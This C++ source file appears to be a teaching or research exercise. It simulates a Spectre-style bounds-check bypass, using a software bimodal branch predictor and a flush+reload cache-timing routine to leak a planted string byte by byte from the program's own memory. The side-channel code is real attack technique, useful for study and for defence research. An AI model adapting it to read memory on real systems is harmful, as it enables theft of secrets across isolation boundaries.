#include <iostream>
#include <iomanip>
#include <cstdint>
#include <cstdlib>
#include <cstring>
#include <ctime>
#include <x86intrin.h>

#include "bimodal_predictor.h"

using namespace std;

uint8_t memory[100];
uint8_t* buffer = memory;
char* secret = (char*)&memory[32];
uint8_t arr[256 * 4096];
unsigned int bound_lower = 0;
unsigned int bound_upper = 9;

#define CACHE_HIT_THRESHOLD (80)
#define DELTA 1024

BimodalPredictor* predictor;

void flushSideChannel() {
    for (int i = 0; i < 256; i++) {
        arr[i * 4096 + DELTA] = 1;
        _mm_clflush(&arr[i * 4096 + DELTA]);
    }
}

void reloadSideChannel() {
    struct timespec start, end;
    long time_diff;
    volatile uint8_t* addr;

    for (int i = 0; i < 256; i++) {
        addr = &arr[i * 4096 + DELTA];
        clock_gettime(CLOCK_MONOTONIC, &start);
        (void)*addr;
        clock_gettime(CLOCK_MONOTONIC, &end);

        time_diff = (end.tv_sec - start.tv_sec) * 1e9 + (end.tv_nsec - start.tv_nsec);

        if (time_diff <= CACHE_HIT_THRESHOLD) {
            cout << "array[" << i << "*4096 + " << DELTA << "] is in cache.\n";
            cout << "The Secret = " << i << " (" << static_cast<char>(i) << ").\n";
        }
    }
}

void spectreAttack(size_t index_beyond) {
    char pc[32];
    for (int i = 0; i < 10; i++) {
        sprintf(pc, "%lx", (uintptr_t)&spectreAttack);
        predictor->predict(pc, "t");
        volatile uint8_t temp = buffer[i];
    }

    _mm_clflush(&bound_upper);
    _mm_clflush(&bound_lower);
    for (int i = 0; i < 256; i++) {
        _mm_clflush(&arr[i * 4096 + DELTA]);
    }

    for (volatile int z = 0; z < 100; z++) {}

    sprintf(pc, "%lx", (uintptr_t)&spectreAttack);
    predictor->predict(pc, "n");

    if (predictor->getLastPrediction() == "t") {
        uint8_t s = *((uint8_t*)buffer + index_beyond);
        cout << "Accessed secret value (s): " << (int)s << " (" << static_cast<char>(s) << ")\n";
        arr[s * 4096 + DELTA] += 88;
    }
}

int main(int argc, char* argv[]) {
    int m = 6;
    if (argc >= 2) {
        m = atoi(argv[1]);
    }

    memcpy(secret, "Some Secret Value", strlen("Some Secret Value") + 1);

    predictor = new BimodalPredictor(m);
    // flushSideChannel();

    // ptrdiff_t index_beyond = secret - (char*)buffer;
    // if (index_beyond <= 0 || index_beyond > 64) {
    //     cerr << "Error: index_beyond is out of safe bounds: " << index_beyond << "\n";
    //     delete predictor;
    //     return 1;
    // }

    // cout << "buffer: " << static_cast<void*>(buffer) << "\n";
    // cout << "secret: " << static_cast<void*>(secret) << "\n";
    // cout << "index of secret (out of bound): " << index_beyond << "\n";

    // spectreAttack(static_cast<size_t>(index_beyond));
    // reloadSideChannel();
    cout << "buffer: " << static_cast<void*>(buffer) << "\n";
    cout << "secret: " << static_cast<void*>(secret) << "\n";

    for (int i = 0; i < strlen(secret); i++) {
        ptrdiff_t index_beyond = (secret - (char*)buffer) + i;
        cout << "\n[Leak attempt for byte " << i << "]\n";
        flushSideChannel();
        spectreAttack(static_cast<size_t>(index_beyond));
        reloadSideChannel();
    }


    predictor->generate_val_traces("sim bimodal " + to_string(m) + " spectre");
    delete predictor;
    return 0;
}
